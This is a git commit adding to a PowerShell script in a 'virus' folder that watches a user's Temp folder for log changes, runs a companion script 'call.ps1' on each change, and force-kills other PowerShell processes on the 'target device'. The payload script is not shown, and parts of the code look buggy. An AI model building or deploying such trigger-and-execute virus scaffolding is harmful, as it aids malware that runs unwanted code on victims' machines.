a731390bbb282258d0baddcd00d0ba91c1831eae
Mavis Coffey <129871621+mavisinator30001@users.noreply.github.com>
2025-01-03 15:25:07 -0500

    Update event.ps1
    event.ps1 will now terminate new instances past a set limit. This is to  prevent an invasion of event.ps1 scripts from overloading the target device.

--- virus/event.ps1
+++ virus/event.ps1
@@ -1,5 +1,20 @@
+$currentPID = $PID
+$duplicateProcess = Get-Process -Name "powershell" | Where-Object { $_.Id -ne $currentPID -and $_.CommandLine -match $MyInvocation.MyCommand.Path }
+
+if ($duplicateProcess.Count -gt 1) {
+    Write-Output "Duplicate found. Terminating new process..."
+    exit 1
+}
+
+
+
+
 $folder = "C:\Users\$env:USERNAME\AppData\Local\Temp\"
 $filter = "*.LOG"
+#$currentProcessName = (Get-Process -Id (Get-Process -Name "powershell" | Select-Object -ExpandProperty Id)).Name
+$duplicateProcess = Get-Process | Where-Object {
+    $_.Name -eq $currentProcessName -and $_.Id -ne (Get-Process -Name "powershell" | Select-Object -ExpandProperty Id)
+}
 $Watcher = New-Object IO.FileSystemWatcher $folder, $filter -Property @{ 
     IncludeSubdirectories = $false
     NotifyFilter = [IO.NotifyFilters]'FileName, LastWrite'
@@ -30,7 +45,7 @@ Function Register-Watcher {
         $timeStamp = $Event.TimeGenerated
         Write-Host "The file $name was $changeType at $timeStamp"
         Invoke-Expression -Command .\call.ps1
-        if (Test-Path -Path "C:\Users\mason\Documents\virus") {
+        if (Test-Path -Path "C:\Users\mason\Document\virus") {
             Write-Host "Directory already exists"
             
 	    
@@ -41,12 +56,14 @@ Function Register-Watcher {
 
     Register-ObjectEvent $Watcher -EventName "Changed" -Action $changeAction
 }
-
+# The Timer
  Register-Watcher "$folder"
- $seconds = 7800
+ $seconds = 120
  while ($seconds -gt 0) {
      Write-Host "Time remaining: $seconds"
-    
+    if ($duplicateProcess.Count -gt 0) {
+        $duplicateProcess | Stop-Process -Force
+    }
      Start-Sleep -Seconds 1
      $seconds--
 
@@ -59,3 +76,4 @@ Write-Host "Script Finished!"
 
 Get-EventSubscriber -Force | Unregister-Event -Force
 exit
+
